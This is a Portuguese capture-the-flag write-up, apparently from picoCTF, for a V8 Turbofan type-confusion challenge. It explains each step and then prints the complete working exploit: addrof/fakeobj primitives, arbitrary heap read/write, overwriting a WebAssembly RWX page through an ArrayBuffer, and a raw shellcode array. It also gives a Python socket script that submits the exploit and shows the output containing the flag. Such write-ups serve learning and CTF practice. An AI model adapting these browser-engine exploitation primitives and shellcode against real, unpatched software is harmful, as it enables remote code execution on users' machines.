Ja tem um exploit [aqui](https://github.com/nico-abram/d8-turboflan)

Visão geralO exploit usa a vulnerabilidade do LowerCheckMaps para criar primitivos de leitura/escrita arbitrária na heap do V8, depois escreve shellcode numa página RWX criada pelo WebAssembly.

Parte 1 — Utilitários de conversão
```
javascriptfunction ftoi(val) { ... }  // float64 -> BigInt (64 bits)
function itof(val) { ... }  // BigInt -> float64
function compress_ptr(old_val, low_32bits) { ... }
// Preserva os 32 bits altos e substitui os 32 bits baixos
// Necessário porque V8 usa pointer compression (ponteiros de 32 bits)

function compress_elementptr(old_val, low_32bits) { ... }
// Igual ao compress_ptr mas subtrai 8 bytes
// Arrays em V8 têm o length armazenado 8 bytes ANTES dos elementos
```

Parte 2 — fl_read e fl_write (trigger da vulnerabilidade)
```
javascriptfunction fl_read(read_arr, idx) {
    let val = read_arr[idx]
    let vval = val
    let x = [1,1,3,4]
    for(var i=0; i < 3; i++) {
        let y = x[x[1]]
        vval += vval ? x[y] : vval;
    }
    return read_arr[idx];  // leitura JIT-compilada
}
```
O loop interno com x é ruído proposital para:

Prevenir inlining pelo JIT
Fazer a função parecer "pesada" para o Turbofan compilar

A função é treinada 1.000.001 vezes com float arrays. Depois quando chamada com object arrays, o JIT não deoptimiza (graças ao patch), então trata os ponteiros de objetos como doubles de 64 bits — type confusion!

Parte 3 — addrof (vazar endereço de qualquer objeto)
```
function addrof(obj) {
    let obj_arr = [obj];
    return ftoi(fl_read(obj_arr, 0)) & 0xFFFFFFFFn
}
```
fl_read foi treinada com floats, mas recebe obj_arr
JIT lê o ponteiro de 32 bits do objeto como se fosse um double de 64 bits
& 0xFFFFFFFFn extrai os 32 bits baixos = endereço comprimido do objeto na heap V8



Parte 4 — fakeobj (criar objeto falso em endereço arbitrário)
```
javascriptfunction fakeobj(addr) {
    let obj = {"a":1}
    let obj_arr = [obj, obj]
    addr = ftoi(addr) & 0xFFFFFFFFn;
    addr = itof(addr | (addr << 32n))  // duplicar nos 64 bits
    fl_write(obj_arr, 0, addr)         // escrever float onde JIT espera objeto
    return obj_arr[0]                  // retornar "objeto" no endereço falso
}
```

fl_write foi treinada com floats, então escreve o valor como float nos 64 bits. Mas obj_arr[0] é lido pelo JS como um ponteiro de objeto → aponta para onde quisermos.

Parte 5 — Arbitrary read/write na heap V8
javascript// Estrutura usada:
```
let obj_arr = [obj_a, obj_a, ...]  // 8 objetos
let fl_arr  = [1.1, 1.2]           // 2 floats

let fl_arr_addr = addrof(fl_arr);
let fl_arr_elementptr_addr = fl_arr_addr + 8n;
// +8 porque: [map(4B)][properties(4B)][elementptr(4B)][length(4B)]

// Sobrescrever obj_arr[5] com o endereço do elementptr de fl_arr
let old_val = fl_read(obj_arr, 5)
let compressed = compress_elementptr(old_val, fl_arr_elementptr_addr)
fl_write(obj_arr, 5, compressed)
// Agora obj_arr[0] aponta para o campo elementptr de fl_arr!
Com isso:
javascriptfunction arb_heap_read(addr) {
    let old = fl_read(obj_arr, 0)
    let elementptr = compress_elementptr(old, addr & 0xFFFFFFFFn)
    fl_write(obj_arr, 0, elementptr)  // redirecionar fl_arr para addr
    return fl_arr[0];                  // ler o valor em addr
}

function arb_heap_write(addr, val) {
    let old = fl_read(obj_arr, 0)
    let elementptr = compress_elementptr(old, addr & 0xFFFFFFFFn)
    fl_write(obj_arr, 0, elementptr)  // redirecionar fl_arr para addr
    fl_arr[0] = val;                   // escrever val em addr
}
```
Parte 6 — Página RWX via WebAssembly

```
javascriptvar module = new WebAssembly.Module(wasm_data);
var instance = new WebAssembly.Instance(module);
var exec_machine_code = instance.exports.main;
Quando V8 compila um módulo Wasm, cria uma página de memória com permissões RWX (read/write/execute) onde coloca o código JIT compilado. O ponteiro para essa página está armazenado dentro do objeto instance na heap.
javascriptvar wasm_instance_base_addr = addrof(instance) - 1n;
var rwx_page_ptr_addr = wasm_instance_base_addr + 105n;
// +105 é o offset fixo do ponteiro RWX dentro do WasmInstance
var rwx_page_ptr = ftoi(arb_heap_read(rwx_page_ptr_addr));
```


Parte 7 — Redirecionar ArrayBuffer para página RWX

```
javascriptvar arr_buf = new ArrayBuffer(0x400);
var dataview = new DataView(arr_buf);

var arr_buf_addr = addrof(arr_buf);
var arr_buf_backing_store_addr = arr_buf_addr + 20n;
// +20 = offset do backing store pointer dentro do ArrayBuffer

arb_heap_write(arr_buf_backing_store_addr, itof(rwx_page_ptr));
// Agora arr_buf aponta para a página RWX!
```

O DataView sobre arr_buf agora escreve diretamente na página executável.

Parte 8 — Shellcode (open/read/write da flag)

```
javascriptvar machine_code = [ 0xfa1e0ff3, ... ];
for (let i = 0; i < machine_code.length; i++) {
    dataview.setBigUint64(i * 4, BigInt(machine_code[i]), true);
}
exec_machine_code();  // executar o shellcode!
O shellcode faz:

open("./flag.txt", O_RDONLY)
read(fd, buffer, 0x1400)
write(1, buffer, bytes_read) → imprime na stdout


Fluxo completo resumido
patch remove DeoptimizeIfNot
        |
   type confusion float <-> object array
        |
   addrof + fakeobj primitivos
        |
   arbitrary read/write na heap V8
        |
   leak ponteiro RWX do WasmInstance
        |
   redirecionar ArrayBuffer backing store -> RWX page
        |
   escrever shellcode via DataView
        |
   exec_machine_code() -> flag!
```








```
cat script.py                                                                                         ✔ 
import socket
code = open('step4-exploit.js').read()
s = socket.socket()
s.connect(('wily-courier.picoctf.net', 52201))
def recv():
    return s.recv(4096).decode()
print(recv())
s.send(f"{len(code)}\n".encode())
print(recv())
s.send(code.encode())
s.shutdown(socket.SHUT_WR)
import socket as _s
while True:
    try:
        data = s.recv(16384)
        if not data: break
        print(data.decode())
    except: break

```




```
 cat ./step4-exploit.js | python3 script.py                                                            ✔ 
Provide size. Must be < 5k:
Provide script please!!

/*
  I just copy pasted the wasm RWX page and shellcode part of my horsepower solution, corrected the names for the read/write 
  functions, removed prints and %DebugPrints and Breakpoints, and it just worked.

*/

// Utils, ftoi, itof, print hex
var buf = new ArrayBuffer(8);
// Views of buf for type punning
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);
function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
// low 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_low32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]);
}
// high 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_hi32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[1]);
}
function itof(val) {
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
function print_hex(int) {
  console.log("0x" + int.toString(16).padStart(16, "0"));
}
function print_fptr(number) {
  print_hex(ftoi(number));
}
// Preserves high 32 bits
function compress_ptr(old_val, low_32bits_to_set) {
  return itof((ftoi_hi32(old_val) << 32n) + low_32bits_to_set);
}
// Preserves high 32 bits and applies the read offset used by JSArrays in reverse (-8 bytes)
function compress_elementptr(old_val, low_32bits_to_set) {
  // No idea why the -8n is needed (It's a 64bit/8byte offset). Length of the array stored before the elements?
  return compress_ptr(old_val, low_32bits_to_set - 8n);
}
// END UTILS

function fl_read(read_arr, idx) {
    let val = read_arr[idx]

    let vval = val
    let x = [1,1,3,4]
    for(var i=0; i < 3; i++) {
        let y = x[x[1]]
        vval += vval ? x[y] : vval;
    }

    return read_arr[idx];
}
let tmp_arr = [1.01, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10];
for(let i=0; i< 100*100*100+1; i++) {
    tmp_arr[0] = fl_read(tmp_arr, i & 1)
}

function fl_write(write_arr, idx, write_val) {
    let val = write_arr[idx]

    let vval = val
    let x = [1,1,3,4]
    for(var i=0; i < 3; i++) {
        let y = x[x[1]]
        vval += vval ? x[y] : vval;
    }

    write_arr[idx] = write_val;
}
for(let i=0; i< 100*100*100+1; i++) {
    fl_write(tmp_arr, i & 1, i)
}

function addrof(obj) {
    let obj_arr = [obj];
    return ftoi(fl_read(obj_arr, 0)) & 0xFFFFFFFFn
}

function fakeobj(addr) {
  let obj = {"a":1}
  let obj_arr = [obj, obj]
  addr = ftoi(addr) & 0xFFFFFFFFn;
  addr = itof(addr | (addr << 32n))
  fl_write(obj_arr, 0, addr)
  return obj_arr[0]
}

let obj_a = {"k":"a"};
// obj array with 8 objects
let obj_arr = [obj_a, obj_a, obj_a, obj_a, obj_a, obj_a, obj_a, obj_a]
// fl array with 2 floats
let fl_arr = [1.1, 1.2]

let fl_arr_addr = addrof(fl_arr);
let fl_arr_elementptr_addr = fl_arr_addr + 8n;

let old_val = fl_read(obj_arr, 5)
let compressed_with_hi32= compress_elementptr(old_val, fl_arr_elementptr_addr)
fl_write(obj_arr, 5, compressed_with_hi32)
// obj_arr now points at fl_arr's elementptr, but we can only write objects to it. We need to use fl_write to write floats

function arb_heap_read(addr) {
    // Write to fl_arr's elementptr through obj_arr
    let old = fl_read(obj_arr, 0, itof(addr))
    let elementptr = compress_elementptr(old, (addr&0xFFFFFFFFn))
    fl_write(obj_arr, 0, elementptr)
    // Use fl_arr for read/write
    return fl_arr[0];
}
function arb_heap_write(addr, val) {
    // Write to fl_arr's elementptr through obj_arr
    let old = fl_read(obj_arr, 0, itof(addr))
    let elementptr = compress_elementptr(old, (addr&0xFFFFFFFFn))
    fl_write(obj_arr, 0, elementptr)
    // Use fl_arr for read/write
    fl_arr[0] = val;
}

var wasm_data = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
    130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
    128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128,
    0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10,
    138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 0, 11,
  ]);
  var module = new WebAssembly.Module(wasm_data);
  var instance = new WebAssembly.Instance(module);
  var exec_machine_code = instance.exports.main;
  
  var wasm_instance_base_addr = addrof(instance) - 1n;
  var rwx_page_ptr_addr = wasm_instance_base_addr + 105n;
  var rwx_page_ptr = ftoi(arb_heap_read(rwx_page_ptr_addr));
  
  var arr_buf = new ArrayBuffer(0x400);
  var dataview = new DataView(arr_buf);
  
  var arr_buf_addr = addrof(arr_buf);
  var arr_buf_backing_store_addr = arr_buf_addr + 20n;
  arb_heap_write(arr_buf_backing_store_addr, itof(rwx_page_ptr));
  console.log(
    "rwx_page_main_ptr: 0x" + rwx_page_ptr.toString(16).padStart(16, "0")
  );
  // See shellcode.js
  // prettier-ignore
  var machine_code = [ 0xfa1e0ff3, 0x56415741, 0x54415541, 0x81485355, 0x001000ec, 0x0c834800, 0x81480024, 0x0007b0ec, 0x002eba00, 0x2cb90000, 0xbb000020, 0x00000101, 0xffff9cbf, 0x66d889ff, 0x98245489, 0x24748d48, 0x0800ba98, 0x89660009, 0xc69a244c, 0x009c2444, 0x8948050f, 0x648d4cc3, 0x8948a824, 0x41902444, 0x00bac789, 0xb8000004, 0x0000004e, 0x894cdf89, 0x48050fe6, 0x840fc085, 0x000000b0, 0x0001ba41, 0x8d4c0000, 0x489b2474, 0x8945c589, 0x6c8d4cd0, 0x29459a24, 0x001f0ff0, 0x8548db31, 0x906f7eed, 0x1c0c8d4d, 0x12798041, 0x718d4900, 0x418d4912, 0x29840f13, 0x44000001, 0xc129d189, 0x00401f0f, 0x4801148d, 0x8001c083, 0x7500ff78, 0xd08944f3, 0x0fd78944, 0x247c8005, 0x840f009a, 0x000000f0, 0x0ff0894c, 0x0000441f, 0x00148d41, 0x01c08348, 0x00ff7880, 0x8944f275, 0xd78944d0, 0x0fee894c, 0xb70f4105, 0x01481041, 0xeb3948c3, 0x00ba927c, 0xb8000004, 0x0000004e, 0x4cff8944, 0x050fe689, 0x48c58948, 0x850fc085, 0xffffff6c, 0x90247c8b, 0x000003b8, 0x45050f00, 0x02bbc931, 0xc6000000, 0x00a72444, 0x2f2eb848, 0x67616c66, 0x8948742e, 0xb89d2444, 0x00007478, 0x44ce8944, 0x8966ca89, 0x48a52444, 0x9d247c8d, 0x050fd889, 0x48c08949, 0xa824b48d, 0xba000003, 0x00001400, 0x44c88944, 0x050fc789, 0xa824bc80, 0x00000003, 0x8d485974, 0x03a92484, 0x01b90000, 0x29000000, 0x001f0fc1, 0x4801148d, 0x8001c083, 0x7500ff78, 0x0001b8f3, 0xc7890000, 0x03b8050f, 0x44000000, 0x050fc789, 0x002504c6, 0x00000000, 0x0f660b0f, 0x0000441f, 0x1fe9d231, 0x66ffffff, 0x00841f0f, 0x00000000, 0xe6e9d231, 0x31fffffe, 0x00c2ebd2 ];
  for (let i = 0; i < machine_code.length; i += 1) {
    dataview.setBigUint64(i * 4, BigInt(machine_code[i]), true);
  }
  
  exec_machine_code();
  

while(true) {}

File written. Running. Timeout is 20s

Run Complete
Stdout b'., .., Dockerfile, Makefile, d8, flag.txt, packages.txt, server.py, source, source.tar.gz, start.sh, picoCTF{Good_job!_Now_go_find_a_real_v8_cve!_995e9be40c30065e}\n'
Stderr b'Received signal 11 SEGV_MAPERR 000000000000\n\n==== C stack trace ===============================\n\n [0x5766e0507937]\n [0x7b7a646f4980]\n [0x0bf911afd1c0]\n[end of stack trace]\n'

```
